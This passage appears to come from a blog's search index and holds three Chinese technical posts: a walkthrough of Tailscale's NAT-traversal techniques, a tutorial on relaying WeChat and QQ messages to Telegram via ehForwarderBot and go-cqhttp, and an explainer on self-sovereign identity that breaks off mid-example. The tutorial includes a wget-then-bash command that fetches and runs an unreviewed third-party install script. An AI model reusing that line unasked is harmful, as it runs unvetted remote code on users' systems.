设备实际上就是一个会修改数据包的有状态防火墙，而这一步修改会带来很多麻烦。将 NAT 后的设备的地址（私有地址）改成公网地址称为 SNAT，反过来将公网地址改成私有地址称为 DNAT。NAT 穿透和 DNAT 无关，麻烦主要来自 SNAT。\n两台位于 NAT 后的设备现在想和对方通信，但并不知道对方的 IP:port。实际上，如果不发起连接，这个 IP:port 根本不存在，因为发起连接后 NAT 设备才会设置一个从公网 IP:port 到内网 IP:port 的映射。因此，两边都需要先发起连接，但都不知道目标是谁，并且只要目标不发起连接就不可能知道。\nSTUN # 可以看到，在没有第三方介入的情况下，这一死锁不可能解决。STUN 服务器就可以扮演这个角色。STUN 协议原理很简单：当 NAT 后的设备访问公网服务器时，服务器看到的一定是被转换后的公网 IP:port 地址，那么让服务器告诉我们它看到的这个地址是什么，我们再把这个我们自己的地址（通过 out-of-band 信道）告诉对端，不就可以了吗？这样就和上文的防火墙问题一样了。\nSTUN 服务器所做的就是像这样告诉你“我看到你在哪”。由于每个 socket 会被 NAT 设备映射到不同的地址，我们必须用控制收发包的 socket 来执行 STUN 协议，这也就是为什么上文提过这是个必要条件。\n有了 STUN，对于大部分家用路由器而言已经可以实现 NAT 穿透了，然而有些路由器会对不同的目标地址设置不同的源地址映射，使得通过 STUN 获取的地址失效。例如，如果我们在公网地址为 2.2.2.2 的路由器上分别与 5.5.5.5:1234 和 7.7.7.7:2345 通信，NAT 在转换源地址时会使用 2.2.2.2 的两个不同的端口号。\nNAT 类型 # 根据 RFC4787，easy NAT，也就是 Endpoint-Independent Mapping（EIM）不会对不同目标地址映射不同源地址；而 hard NAT，也就是 Endpoint-Dependent Mapping（EDM）会。这一分类是我们在进行 NAT 穿透时真正关心的，而 NAT Cone 分类则是增加了一个防火墙的维度。但由于之前的同步发送包的方法已经可以穿过防火墙，这种分类对我们意义不大。\nEndpoint-Independent NAT Endpoint-Dependent NAT Endpoint-Independent Firewall Full Cone Endpoint-Dependent Firewall\n(dest. IP only) Restricted Cone Endpoint-Dependent Firewall\n(dest. IP+port) Port-Restricted Cone Symmetric 后备方案 # 上文提过，因各种原因（如拦截所有 UDP 包的防火墙）无法成功利用 UDP 建立连接时，Tailscale 采用 基于 TCP 和 HTTP(s) 的 DERP 服务中转流量，这一后备机制保证了连接能成功建立，毕竟通常防火墙不会阻止传出的 HTTP(s) 连接。\n使用 DERP 中转无疑会带来延迟和更低的带宽，因此只有当其余方法都失败时才会切换到 DERP。实际上，DERP 不仅是后备方案，也是协助 NAT 穿透的一个 out-of-band 信道。而当 UDP 打洞成功时，DERP 还能自动升级到 peer-to-peer 连接，十分方便。因此 Tailscale 网络中两台机器建立连接时，往往是先通过 DERP 连接确保连接能够建立，随后再升级到 peer-to-peer 连接提升速度和带宽。\n实际上，面对 hard NAT，我们也并非束手无策只能使用 DERP。Tailscale 还引入了许多更高级的 NAT 穿透玩法来尽可能覆盖更多 hard NAT 场景，从而在这些场景下也能成功建立 peer-to-peer 连接。\n穿透 hard NAT # 利用生日悖论 # 现在假设两台机器分别位于一个 easy NAT 和一个 hard NAT 后面，此时 easy NAT 后的机器不知道要发送包给谁。我们先假设 hard NAT 后面的机器通过 STUN 获取的 IP 是正确的，那么就剩端口号不知道了。\n端口号有 65535 种可能，如果用 100 个包每秒的速度穷举需要 10 分钟，而且与端口扫描无异，容易被 IDS 检测后阻止。但如果我们在 hard NAT 后的机器上开放不止一个端口（使用不止一个 socket 发送包）呢？\n我们可以在 hard NAT 后的机器上开放 256 个端口，然后在 easy NAT 后的机器上向其随机端口发包。根据生日悖论，我们可以计算出多次探测后的成功概率：\n随机探测次数 成功率 174 50% 256 64% 1024 98% 2048 99.9% 可以看到，如果以 100 个包每秒的速度探测，两秒内成功的概率就能超过 50%；即使在运气差的情况下，20 秒内几乎肯定能成功，此时只探测了约 3% 的端口。当然，这会让连接建立有所延迟，但是之前会先有 DERP 保底，所以还行。\n然而，如果两边都是 hard NAT，由于此时源端口也需要随机了，搜索空间就变成了原来的平方。这种情况下要达到 99.9% 的成功率需要 170000 次探测，以 100 个包每秒的速度需要 28 分钟；而 50% 的成功率则需要 54000 次探测和 9 分钟。而且，也并不是所有路由器都能维持这么多的会话和承受这样的负载。\n尽管如此，考虑到连接建立后只需要持续发包保证连接不断就能一直用，某些场景下 28 分钟也不是不能接受。总得来收生日悖论让我们能比较好地对付一个 hard NAT 的场景，和少数两个 hard NAT 的场景。\n修改端口映射 # hard NAT 之所以 hard 是因为 NAT 设备会修根据目标地址改端口映射。这一行为是否可以被部分绕过呢？实际上，不仅可以，还有三个协议都支持。\n最老的协议是 UPnP IGD（Universal Plug’n’Play Internet Gateway Device），因为年代关系难以实现也难以确保安全，不过许多路由器都支持这一协议。后来出现了更易实现和更安全的 NAT-PMP（NAT Port Mapping Protocol）和其第二版 PCP（Port Control Protocol），主要用于端口转发。这三种协议本质上都是向 NAT 设备请求分配一个 WAN 端口（公网 IP 的端口）映射到某个内网设备的某个端口。\nTailscale 所做的就是测试本地网关是否支持这三种协议之一，如果支持则请求一个端口映射。此时在通过 STUN 获取 IP:port 后，我们实际上告诉了 NAT 设备不要对这个端口应用防火墙规则，这样在这个端口上进行 NAT 穿透就很容易了。\n但这三种协议不一定所有路由器都支持，即使支持也可能被默认关闭了、或者是因为安全策略主动关闭了。因此，不能认为这些协议一定可用。\n多层 NAT # 由于 IPv4 数量越发稀缺，许多 ISP 已经不再给家用宽带分配公网 IP。也就是说，家用宽带的地址依然是经过 ISP NAT 过后的地址，此时我们需要穿透多层 NAT。\n由于 NAT 对内网机器而言是透明的，之前的 NAT 穿透方法依然不会受到什么影响，但修改端口映射行不通了，因为它们都运行在距离内网机器最近的一层 NAT 上，而实际需要修改端口映射的是距离最远的（最外层的）NAT。因此，多层 NAT 饱受诟病，尽管多数应用程序不会进行显式 NAT 穿透，不会受到影响。\n然而，端口映射协议失效意味着许多多人在线游戏的体验大幅下降，且很可能不会有 IPv6 支持，因此有选择的情况下并不建议使用多层 NAT。\nCGNAT # 上面提到的 ISP NAT 被称为 CGNAT（Carrier-grade NAT）。在 CGNAT 之前，我们还可以手动设置家庭路由器来进行方便的 NAT 穿透，但我们无法设置 ISP 级的 NAT 设备。好在 CGNAT 是多层 NAT 的一种，因此之前的 NAT 穿透技术能用。\n但是，如果我们想连接的两台设备在两个不同的 NAT 下，但在同一个 CGNAT 下呢？这里的问题主要在于，此时我们需要的 IP:port 是在 CGNAT 下的地址，但 STUN 服务器由于在公网上，返回的是 CGNAT 外的地址也就是公网地址。\n这时，因多层 NAT 而失效的端口映射协议就派上了用场。只要两台设备对应的两个 NAT 设备中有一个支持端口映射协议，那么对应的设备就相当于被 un-NAT 了，此时就变成了类似一层 NAT 设备和公网机器连接的情况，非常简单。不过，我们依然不能认为端口映射协议一定可用，因为端口映射协议支持通常被 ISP 默认关闭。\n那么，如果两个 NAT 设备都不支持端口映射协议怎么办呢？假设现在有两台设备 A 和 B，分别运行 STUN 协议，得到的结果是 2.2.2.2:1234 和 2.2.2.2:5678。那么为了 A 发送的数据包能到达 B，预期的 CGNAT 的行为类似：\nCGNAT 查找 A 的 NAT 映射，修改源地址为 2.2.2.2:1234，目标地址依然为 2.2.2.2:5678 但 2.2.2.2:5678 和 B 的 NAT 映射相符，因此将目标地址改为 B 的内网地址 将数据包通过内网网卡发送给 B，而不是向公网转发 这一行为被称为 Hairpinning。可以预想到，并不是所有 NAT 设备支持 Hairpinning。多数情况下，NAT 设备是否支持 Hairpinning 并不重要，因为内网两个设备通信一般不会经过网关。但对于 CGNAT 而言，这关乎到你是否能成功建立 peer-to-peer 连接而不用关心自己是不是在一个 CGNAT 后面。如果 Hairpinning 和端口映射协议都不可用，那就只能用 DERP 了。\nIPv6 # 如果所有设备都能被一个固定的唯一 IP 访问到，就用不着上面一大堆 NAT 相关的技巧了，包括 STUN、生日悖论、端口映射协议和 Hairpining。然而 IPv6 尚未普及，因此只能算是一种备选方案，还不能算是一种解决方案。并且，IPv4 和 IPv6 混合的网络中，又多出了一种我们不得不考虑的设备：NAT64。\n上文中提及的 NAT 都是指 NAT44，即将 IPv4 地址转为 IPv4 地址的 NAT。同理，NAT64 将内网 IPv6 地址转为公网 IPv4 地址，结合将 IPv4 DNS 应答转换为 IPv6 地址的 DNS64，我们可以构建一个 IPv6-only 的内网，同时还能访问 IPv4 网络。\n如果只关注 DNS 域名，那当然可以正常使用，但我们还关心 IP 和端口号，因为我们要穿透 NAT。幸运的话，我们的设备支持 CLAT（Customer-side translator），这样 OS 假装能直连 IPv4，实际上用的是 NAT64，而我们不用担心任何事情。\n但 CLAT 在移动设备上比较普遍，笔记本、主机和服务器上就比较少见了，此时我们得手动去完成 CLAT 的工作，也就是检测 NAT64+DNS64 设置并使用。检测只需要发送 DNS 请求到 ipv4only.arpa.，这一域名解析到一个固定的 IPv4 地址，而如果返回的是 IPv6 地址，那说明 DNS64 翻译过了，此时就能获得 NAT64 前缀。\n这样，如果要发送包到 IPv4 地址，只要发送 IPv6 包到 {NAT64 prefix + IPv4 address}，同理从这个地址收到的包也来自 IPv4 地址。现在就可以和 STUN 服务器通信，获得 NAT64 后的 IP:port，于是我们又回到了经典的 NAT 穿越场景。\n好在如今多数 IPv6-only 网络是移动网络，而且几乎所有移动设备都支持 CLAT，所以我们很少需要手动去完成 CLAT 的工作。但边界情况也是情况，为了确保连接可用，必须支持在 IPv6-only 网络上与 IPv4-only 网络上的设备通信。\n大整合 # 现在我们实现了所有这些防火墙穿透和 NAT 穿透技巧，那我们怎么判断什么情况下用什么技巧呢？答案来自一个同样和电话相关（STUN 也是）的协议——ICE（Interactive Connectivity Establishment）。简单来说，就是把能试的都是一遍，然后选最好的那个。\n更详细地说，首先我们需要获取一个本地 socket 可能的地址列表，包含了所有其他设备可能能访问到的本机的 IP:port 地址，至少应包括：\nIPv6 的 IP:port IPv4 内网 IP:port IPv4 公网 IP:port（获取自 STUN） IPv4 公网 IP:port（通过端口映射协议获取） 手动设置的 endpoint 地址（如静态端口转发） 随后，我们与对端通过 out-of-band 信道交换这一列表，并开始逐一探测对方列表中的项。这些探测包既是用来穿透防火墙和 NAT 的，又能作为健康检查的消息。最后，我们选择一个“最佳”（根据特定的指标）的路径作为我们的穿透方案。\nICE 的指标是预先设定的 LAN \u0026gt; WAN \u0026gt; WAN+NAT，而 Tailscale 则基于 round-trip 延时，最终的顺序通常也是 LAN \u0026gt; WAN \u0026gt; WAN+NAT，但无需预先设定这一顺序。ICE 需要先进入探测阶段随后再进入通信阶段，但 Tailscale 中没有这一顺序限制。上文已经提过，Tailscale 优先建立 DERP 连接使得连接立即可用，同时并行地进行路径发现；一旦发现更优路径，连接就可以自动、透明地升级。\n需要注意的是，我们需要确保连接往返的路径是一致的，否则路径上的防火墙可能会因为会话超时而关闭对应端口的访问。方法很简单，持续发送 ping/pong 消息即可。如果追求更强的健壮性，我们还需要检测目前的路径是否可用，如果不可用则切换到另一条路径。考虑到路径不可用的情况较为罕见，一个简单的处理办法是直接降级为 relay，然后重新开始路径发现。\n最后，通信的安全性则由上层协议保证，如 QUIC 使用 TLS 证书、WireGuard 采用公钥密码等。而当动态切换路径时，显然基于 IP 地址的安全防护策略没有意义。总之，上层协议至少要保证端到端加密和认证。\n如果上层协议安全，那么 ping/pong 消息即使能被伪造也没关系，因为最坏情况下攻击者也只能将你的流量导向他所控制的服务器，但端到端加密决定了攻击者无法获取任何消息内容。当然，我们也可以对这类路径发现包进行加密和认证以进一步提高安全性。\n总结 # 可以看到，NAT 穿透问题其实相当复杂——解决大部分情况下的 NAT 穿透比较简单，但对于各类少见情况的处理引入了极大的复杂度。但研究这一问题不仅有趣，而且是值得的：建立 peer-to-peer 连接后，我们能实现许多传统架构下不能做的事。回顾前文，我们可以总结出实现健壮的 NAT 穿透所需要的准备：\n一个基于 UDP 的协议 对收发数据包的 socket 的直接控制权 一个与对端设备在未建立连接时通信的 out-of-band 信道 若干个 STUN 服务器 一系列后备中转服务器 随后，我们需要：\n枚举当前 socket 的所有的 IP:port 地址 查询 STUN 服务器获取公网 IP:port 地址以及所处的 NAT 类型 尝试端口映射协议以获取更多公网 IP:port 检测 NAT64 的存在，并通过它获取另一个公网 IP:port 将所有获取的地址与密钥和对端通过 out-of-band 信道交换 与对端通过后备中转服务器建立连接并进行通信 尝试与对端的 IP:port 建立连接并检测连接质量，必要的话使用穿透 hard NAT 的技巧 发现更优连接线路后，透明地升级到该线路上继续通信 如果当前线路停止工作，降级以保持连接不中断 确保端到端加密和认证 参考资料 # How Tailscale works\nHow NAT traversal works\n","date":"2022-09-23","permalink":"/posts/tailscale/","section":"Posts","summary":"\u003cp\u003e组建自己的私有零信任网络。\u003c/p\u003e","title":"冲云破雾：Tailscale 原理简述"},{"content":"和毒瘤软件说再见。\n动机 # 为什么要用 Telegram 收发微信和 QQ 消息？不仅是因为 Telegram bot 好玩而这恰好可以作为一次实践机会，还有如下几点原因：\n可以减少受到此类毒瘤软件的毒害 可以在 PC 上卸载微信和 QQ 客户端，在手机上卸载 QQ 客户端并大幅减少打开微信的频率；同时微信也不再需要常驻后台 天下苦微信久矣。但相比完全不使用微信，这种方式能给自己和他人带来更少麻烦 在 Telegram 上获得更好的使用体验 对消息的管理更便捷，例如可以将多个微信群的消息转发到同一个 Telegram 群组中（随后可以选择静音群组） 将所有消息聚合至同一软件，减少切换，方便管理和查看 背景 # 早期大部分微信用户可以顺畅地登录和使用微信网页版，因此以 itchat 为代表的一系列利用微信 Web API 实现个人账号自动化的框架十分火热。但好景不长，微信很快限制了绝大部分用户登录网页版的能力，致使 Web API 近乎等同于失效。\n随后开发者发现 UOS 版的微信是微信网页版套了 Electron 的壳，因此使用 UOS 版微信作为 UA 可以绕过这一限制。然而这一举措随着 UOS 微信无法登录再次失效。遭受同样命运的还有利用文件传输助手登录网页版微信的办法。但近期出于未知原因，UOS 版微信登录突然恢复了，使得网页版微信再次成为可能。\n此外，还存在多种利用 Windows hook 的方式，如 可爱猫 等。但利用此类框架收发消息需要 Windows VPS，成本较高。\nQQ 也曾出现过类似的大规模封禁 QQ 机器人的事件，但相比微信更开放的生态催生了诸如 mirai、go-cqhttp 这样的优秀自动化框架，能让我们轻松许多。\n原理 # 调研初期，预期的目标仅仅是尽可能减少对微信客户端的依赖。而经过调研，目前最为成熟（且免费）的方案是使用 ehForwarderBot 将消息转发至 Telegram。 其原理大致如图：\n可以看到，我们首先需要一个 Telegram Bot 作为前端，并在自己的服务器上启动 EH Forwarder Bot 作为后端。根据配置文件它会启动 Telegram Master 用于和 EH Forwarder Bot 直接通信，而 Telegram Master 则会和两个 Slave 通信。Wechat Slave 利用 UOS 版请求头与微信 API 交互，而 QQ Slave 则通过另外启动的 QQ 客户端来访问 QQ 的 API。这里的 QQ 客户端当然不是我们平时使用的桌面版 GUI 客户端，而是类似 mirai、go-cqhttp 这样的交互框架。这个例子里我们使用更轻量的 go-cqhttp。\n实现 # 环境 # 能够同时访问微信、QQ、Telegram 的 API 的服务器（如果不能访问 Telegram API 则需要在服务器上额外配置代理或使用境外服务器反代） Python 3.6+ 可正常使用的 Telegram 账号 版本信息 # ehForwarderBot v2.1.1 efb-telegram-master v2.3.0 efb-wechat-slave v2.0.7 efb-qq-slave v2.0.1 go-cqhttp v1.0.0-rc3 efb-qq-plugin-go-cqhttp @master 参考步骤 # 安装 # 手动安装并不复杂，但使用自动脚本更简单，注意这一自动脚本仅仅设置微信转发：\n$ wget https://raw.githubusercontent.com/hookjk100/efb-install/main/install.sh -O install.sh \u0026amp;\u0026amp; chmod +x install.sh \u0026amp;\u0026amp; bash install.sh 这一脚本最重要的是会自动设置守护进程，免去许多麻烦。随后 patch 一下 efb-wechat-slave 并安装剩余依赖：\n$ pip3 uninstall efb-wechat-slave $ pip3 install git+https://github.com/ehForwarderBot/efb-wechat-slave $ pip3 install efb-qq-slave $ wget https://github.com/Mrs4s/go-cqhttp/releases/download/v1.0.0-rc3/go-cqhttp_1.0.0-rc3_linux_amd64.deb $ dpkg -i go-cqhttp_1.0.0-rc3_linux_amd64.deb $ pip install git+https://github.com/XYenon/efb-qq-plugin-go-cqhttp 设置 Telegram Bot # 安装时不妨先去 Telegram 找 @BotFather 创建自己的 Bot，并记得 /setprivacy 为 Disable 来让 Bot 也能收取非 / 开头的消息。最后 /setcommand：\n/link 将一个远端会话与一个空 Telegram 群组绑定。 通过附加正则表达式来筛选结果。 /chat 生成一个会话头以开始会话。 通过附加正则表达式来筛选结果。 /extra 列出所有由从端提供的附加功能。 /unlink_all 断开该会话中的所有远程会话。 /info 显示该 Telegram 会话的相关信息。 /react [emoji] 使用 emoji 对一条消息进行回应，或者列出所有组员做出过的回应。 /update_info 更新被绑定 Telegram 群组的详情信息。 只对被单独绑定且 Bot 为管理员的群组有效。 /rm 从远端会话中移除被引用回复的消息。 /help 显示本帮助信息。 这里比较重要的是 /link 命令和 /chat 命令。前者可以将来自同一联系人的消息分流到同一个 Telegram Group 或 Channel 中，后者则能新发起一个对话。利用 /update_info ，甚至可以将原群组的名称、头像和成员列表同步过来。\n设置 Telegram Master # 保存 Bot 的 token，并写入 Telegram Master 的配置 ~/.ehforwarderbot/profiles/default/blueset.telegram/config.yaml：\ntoken: \u0026#34;your bot token\u0026#34; admins: - your Telegram ID admins 决定了哪些用户能管理 Bot，即利用 Bot 收发消息，这里的 Telegram ID 可以通过现有的许多 ID Bot 获得。\n设置 EH Forwarder Bot # 然后修改 ~/.ehforwarderbot/profiles/default/config.yaml，即 EH Forwarder Bot 本身的配置：\n# =================================== # EH Forwarder Bot Configuration File # =================================== # # This file determines what modules, including master channel, slave channels, # and middlewares, are enabled in this profile. # # # Master Channel # -------------- # Exactly one instance of a master channel is required for a profile. # Fill in the module ID and instance ID (if needed) below. master_channel: blueset.telegram # Slave Channels # -------------- # # At least one slave channel is required for a profile. # Fill in the module ID and instance ID (if needed) of each slave channel # to be enabled below. slave_channels: - blueset.wechat - milkice.qq # Middlewares # ----------- # Middlewares are not required to run an EFB profile. If you are not # going to use any middleware in this profile, you can safely remove # this section. Otherwise, please list down the module ID and instance # ID of each middleware to be enabled below. middlewares: [] flags: message_muted_on_slave: silent 有兴趣的话还可以添加中间件。\n设置 Wechat Slave # 类似地，可以配置 Wechat Slave 的 ~/.ehforwarderbot/profiles/default/blueset.wechat/config.yaml，这里仅仅是我的配置：\nflags: max_quote_length: 60 delete_on_edit: true 至此，微信转发已经配置完毕。\n设置 QQ Slave # 同理配置 QQ Slave 的 ~/.ehforwarderbot/profiles/default/milkice.qq/config.yaml：\nClient: GoCQHttp GoCQHttp: type: HTTP access_token: api_root: http://127.0.0.1:5700/ host: 127.0.0.1 port: 8000 设置并运行 go-cqhttp # 随后，就可以运行 go-cqhttp 作为我们的 QQ 客户端了，首次运行会在同目录生成配置文件，需要修改的包括：\naccount: # 账号相关 uin: 123456789 # QQ账号 password: \u0026#34;xxxxxx\u0026#34; # 密码为空时使用扫码登录 message: # 上报数据类型 # 可选: string,array post-format: array # 为Reply附加更多信息 extra-reply-data: true # 连接服务列表 servers: # 添加方式，同一连接方式可添加多个，具体配置说明请查看文档 #- http: # http 通信 #- ws: # 正向 Websocket #- ws-reverse: # 反向 Websocket #- pprof: #性能分析服务器 - http: # HTTP 通信设置 address: 127.0.0.1:5700 # HTTP监听地址 post: # 反向HTTP POST地址列表 - url: \u0026#34;http://127.0.0.1:8000\u0026#34; secret: \u0026#34;\u0026#34; 修改后，重启 go-cqhttp。由于 go-cqhttp 是单个二进制文件，我们可以编写一个脚本来管理服务（假设配置目录位于 ~/go-cqhttp）：\n#!/usr/bin/env bash CONFIG_DIR=~/go-cqhttp case \u0026#34;$1\u0026#34; in start) echo \u0026#34;Starting go-cqhttp...\u0026#34; go-cqhttp -c $CONFIG_DIR/config.yml -d ;; stop) echo \u0026#34;Stopping go-cqhttp...\u0026#34; kill $(cat $CONFIG_DIR/go-cqhttp.pid) ;; status) netstat -nplt | grep go-cqhttp if [ $? -ne 0 ] then echo \u0026#34;inactive\u0026#34; fi ;; restart) echo \u0026#34;Stopping go-cqhttp...\u0026#34; kill $(cat $CONFIG_DIR/go-cqhttp.pid) echo \u0026#34;Starting go-cqhttp...\u0026#34; go-cqhttp -c $CONFIG_DIR/config.yml -d ;; *) echo \u0026#34;Usage: $0 start|stop|status|restart\u0026#34; exit 1 ;; esac 运行 EH Forwarder Bot # 此时，终于可以启动 ehforwarderbot 并登录，最后就能在 Telegram bot 中收到相应的信息。经测试，部分情况下甚至会比客户端更快收到消息。\n我们可以用 journalctl 查看 efb 日志：journalctl -f -u efb.service。绝大部分问题可以通过查看日志/重启进程/（删除 device.json 后）重新登录解决。\n使用事件过滤器 # 有时我们并不关心诸如有人加群/退群之类的消息，此时可以使用 go-cqhttp 提供的事件过滤器。首先在配置文件中开启 default-middlewares.filter：\n# 默认中间件锚点 default-middlewares: \u0026amp;default # 事件过滤器文件目录 filter: filter.json 随后编写 filter.json 文件：\n{ \u0026#34;.not\u0026#34;: { \u0026#34;.or\u0026#34;: [ { \u0026#34;notice_type\u0026#34;: \u0026#34;group_increase\u0026#34; }, { \u0026#34;notice_type\u0026#34;: \u0026#34;group_decrease\u0026#34; } ] } } 如果需要过滤更多类型的消息，可以参考 go-cqhttp 事件过滤器文档。\n结果 # 经过这番折腾，基本达到了预期目标。目前使用下来非常稳定，且一次登录后不需要再重复登录。即使因为修改配置需要重启 EFB，也依然不需要额外的操作。\n然而更好的体验同样伴随着一定代价：\n手机上代理需要常驻开启 除纯文字消息外的消息都会或多或少受到影响，更不用提更高级的功能了，因此不能在移动端完全脱离微信（基础聊天功能影响不大，如图片、视频、语音等） 其他可能存在的未知问题 对于此类社交工具的轻度使用者，我认为这是可以接受的。\n附录：利用 Telegram 整合其他信息 # Slack 消息 # 可以借助自动化平台 Make 自建 Scenario 实现，不过免费版限额比较少，仅适合用于消息不多的群组/频道。经测试，通知较为及时、交互体验良好且调试十分方便。\nMake 没有官方 Telegram Bot，但也只需要用上文的方法自建一个，随后提供 token 即可。\nGitHub 通知 # 如果只需要关注单个仓库的通知，那么选择很多，比如 @GitHubBot，还有相应的 GitHub Actions Workflow。但如果需要接收所有的通知并转发到 Telegram，目前仅发现通过 IFTTT 自建 Applet 可以支持，不过免费版同样限制只能使用 5 个 Applet，且每小时轮询一次，通知延时比较大。\n目前发现的最佳解决方案还是 Gitify 和 Neat 这类菜单栏 GitHub 通知软件。\nGmail 邮件 # 有官方 Telegram Bot @GmailBot。\nRSS 订阅 # 利用 RSSHub 生成订阅源，随后可以通过 @RSStT_Bot 接收消息。这两个服务都可以自建以获得更好的体验。\n参考资料 # UOS Patch, itchat can work just like before 微信网页版恢复了 重磅：使用 UOS 微信桌面版协议登录，wechaty 免费版 web 协议重放荣光 安装并使用 EFB：在 Telegram 收发微信消息 安装并使用 EFB：在 Telegram 收发 QQ 消息 efb-qq-plugin-go-cqhttp Issue#19 ","date":"2022-08-18","permalink":"/posts/tg-wechat-qq/","section":"Posts","summary":"\u003cp\u003e和毒瘤软件说再见。\u003c/p\u003e","title":"去繁就简：用 Telegram 收发微信和 QQ 消息"},{"content":"","date":"2022-08-18","permalink":"/tags/%E5%BE%AE%E4%BF%A1/","section":"Tags","summary":"","title":"微信"},{"content":"","date":"2022-07-02","permalink":"/categories/web-%E5%AE%89%E5%85%A8/","section":"Categories","summary":"","title":"Web 安全"},{"content":"","date":"2022-07-02","permalink":"/tags/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/","section":"Tags","summary":"","title":"分布式系统"},{"content":"","date":"2022-07-02","permalink":"/tags/%E8%AE%A4%E8%AF%81/","section":"Tags","summary":"","title":"认证"},{"content":"更安全方便地管理、分享和验证身份信息。\n自主身份（Self-Sovereign Identity）是一种以用户为中心的数字身份机制，允许用户和组织完全控制他们的身份信息。因此，SSI 能让任何人可靠地分享和证明其身份，同时不牺牲隐私。\n基本原理 # SSI 能让我们像在现实中用纸质文件和卡片一样建立自己的数字身份，并且任何人都能可靠地在线上或者线下验证这些身份。这样一来，SSI 就能在去中心化的生态系统中让用户交换身份信息。在这类系统中存在三类角色：\n签发者 Issuers - 签发数字身份给个人或组织（Holders）的一方，是 SSI 系统中的数据源 持有者 Holders - 从不同 Issuers 处接收包含自身身份信息的数字身份的个人或组织。通过聚合和存储这些数字身份，Holders 能构建出一套完整的并完全由自己控制的数字身份 验证者 Verifiers - 需要验证上述数字身份从而提供产品和服务的一方 一般来说，个人或组织在一次交互中只会担任其中一个角色，但担任多个角色的情况也十分常见。比如 Issuer 和 Verifier 经常是重合的。\n技术概念 # 首先需要了解一些核心概念：\nRegistries - 提供共享的、可信的特定信息，可以认为是可信数据源 密钥 - 通过密码学控制和处理数字身份信息，例如加密和认证 Decentralized Identifiers（DIDs）- 通过将密钥对应到唯一的标识符来建立一套公钥基础设施 Verifiable Credentials（VCs）- 包含数字身份的“证件”，可以方便地分享和验证，同时保护隐私。需要注意，出于隐私和合规性原因，它们不会被存储在区块链上 Protocols - 不同主体间交换 VC 的协议 Wallets - 用于存储密钥和 VC，让我们能通过简单易用的应用程序来管理和分享数字身份 SSI 的这些核心概念构成了整个技术栈：\n技术栈中的每个模块都可以采用不同的技术来实现，于是会诞生不同类型的 SSI 系统。因此，在构建 SSI 系统时，技术和服务选型是需要考虑的重要问题。\n完整的身份认证过程则如下图所示，Issuers 首先创建身份信息并签名，随后签发给 Holders。Holders 负责管理这些身份信息，并向 Verifiers 出示合适的身份信息。Verifiers 对其进行验证，通过后提供服务。整个过程依赖于可信的 Registry，并且均涉及对 DID 的读写。\n技术细节 # 密钥比较容易理解，这里不再作介绍。\nRegistries # SSI 系统中的所有参与者都可以信任 Registries，因此 Registries 是分布式公钥基础设施 DPKI 的基础，也是所有可信数据的来源。我们可以使用不同技术来实现 Registries，例如：\n区块链或 L1：通常我们利用其不可篡改性来防止参与者修改身份信息数据，如今使用的较多的是带权限控制的区块链（例如可以指定特定的组拥有写权限），比如 Ethereum Quorum L2：L2 网络位于区块链上层并能聚合数据，从而更好地解决传统区块链的可扩展性和成本问题，其中和数字身份相关的实现有 Bitcoin 的 ION 和 Ethereum 的 Element 等 其他分布式账本技术（DLTs）：例如 IPFS，但在数字身份领域作用有限 DNS：尽管不完全是分布式的，DNS 因为成熟和普及也常被用作 Registries 值得注意，实现 SSI 并不一定需要实现 Registries，但实现 Registries 能更好地融合其它基于 DPKI 和可信 Registries 的服务。\nDecentralized Identifiers (DIDs) # DID 是 W3C 标准化的一种唯一标识符，用于构建 DPKI 使得参与者能发现彼此，并认证、加密、签名和验证数据。\nDID 存在多种不同实现，也各有优劣。许多实现依赖于 Registries，例如 did:ebsi 依赖 EBSI、did:web 依赖 DNS，但一些新的实现并不需要 Registries 因为其分发机制基于 peer-to-peer 的交互，例如 did:key。\n举个例子，did:ebsi:2A9RkiYZJsBHT1nSB3HZAwYMNfgM7Psveyodxrr8KgFvGD5y 会被解析为如下 DID document：\n{ \u0026#34;@context\u0026#34;: [\u0026#34;https://w3id.org/did/v1\u0026#34;], \u0026#34;authentication\u0026#34;: [ \u0026#34;did:ebsi:2A9RkiYZJsBHT1nSB3HZAwYMNfgM7Psveyodxrr8KgFvGD5y#1a7514b2d58141c3982021a6323b99bf\u0026#34; ], \u0026#34;id\u0026#34;: \u0026#34;did:ebsi:2A9RkiYZJsBHT1nSB3HZAwYMNfgM7Psveyodxrr8KgFvGD5y\u0026#34;, \u0026#34;verificationMethod\u0026#34;: [ { \u0026#34;controller\u0026#34;: \u0026#34;did:ebsi:2A9RkiYZJsBHT1nSB3HZAwYMNfgM7Psveyodxrr8KgFvGD5y\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;did:ebsi:2A9RkiYZJsBHT1nSB3HZAwYMNfgM7Psveyodxrr8KgFvGD5y#1a7514b2d58141c3982021a6323b99bf\u0026#34;, \u0026#34;publicKeyJwk\u0026#34;: { \u0026#34;alg\u0026#34;: \u0026#34;EdDSA\u0026#34;, \u0026#34;crv\u0026#34;: \u0026#34;Ed25519\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;1a7514b2d58141c3982021a6323b99bf\u0026#34;, \u0026#34;kty\u0026#34;: \u0026#34;OKP\u0026#34;, \u0026#34;use\u0026#34;: \u0026#34;sig\u0026#34;, \u0026#34;x\u0026#34;: \u0026#34;tqJADByHRU3YxswewQD4wQYXU9tB43j3PfjofsYEvqs\u0026#34; }, \u0026#34;type\u0026#34;: \u0026#34;Ed25519VerificationKey2018\u0026#34; } ] } Verifiable Credentials (VCs) # 实际的身份数据就存储在 VC 和 VP 中。VC 由 Issuers 签发，通常至少包含：\nIssuer 的 DID 接收者（Holder）的 DID VC 的有效性相关信息 接收者的属性，如名字、年龄、地址等 Issuer 的签名和其他信息 一个典型的 VC 长这样：\n{ \u0026#34;@context\u0026#34;: [ \u0026#34;https://www.w3.org/2018/credentials/v1\u0026#34;, \u0026#34;https://essif.europa.eu/schemas/v-a/2020/v1\u0026#34;, \u0026#34;https://essif.europa.eu/schemas/eidas/2020/v1\u0026#34; ], \u0026#34;id\u0026#34;: \u0026#34;education#higherEducation#3fea53a4-0432-4910-ac9c-69ah8da3c37f\u0026#34;, \u0026#34;type\u0026#34;: [\u0026#34;VerifiableCredential\u0026#34;, \u0026#34;VerifiableAttestation\u0026#34;], \u0026#34;issuer\u0026#34;: \u0026#34;did:ebsi:2757945549477fc571663bee12042873fe555b674bd294a3\u0026#34;, \u0026#34;issuanceDate\u0026#34;: \u0026#34;2019-06-22T14:11:44Z\u0026#34;, \u0026#34;validFrom\u0026#34;: \u0026#34;2019-06-22T14:11:44Z\u0026#34;, \u0026#34;credentialSubject\u0026#34;: { \u0026#34;id\u0026#34;: 